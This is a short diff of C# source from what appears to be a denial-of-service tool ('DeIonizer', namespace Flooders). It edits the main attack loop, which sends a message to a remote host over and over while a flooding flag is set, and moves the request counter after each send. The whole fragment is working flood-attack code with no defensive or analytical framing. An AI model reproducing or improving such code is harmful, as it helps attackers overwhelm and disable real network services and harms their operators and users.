@@ -34,13 +34,14 @@ namespace DeIonizer.Core.Flooders
                         socket.Blocking = false;
                         State = AttackStatus.Requesting; // SET STATE TO REQUESTING //
 
+                        //Keep flooding!
                         try
                         {
-                            while (this.IsFlooding)
+                            while (IsFlooding)
                             {
-                                Requested++;
                                 var buf = System.Text.Encoding.ASCII.GetBytes(Message);
                                 socket.SendTo(buf, SocketFlags.None, remoteHost);
+                                Requested++;
                                 //Give the CPU a break
                                 if (Delay >= 0) Thread.Sleep(Delay + 1);
                             }
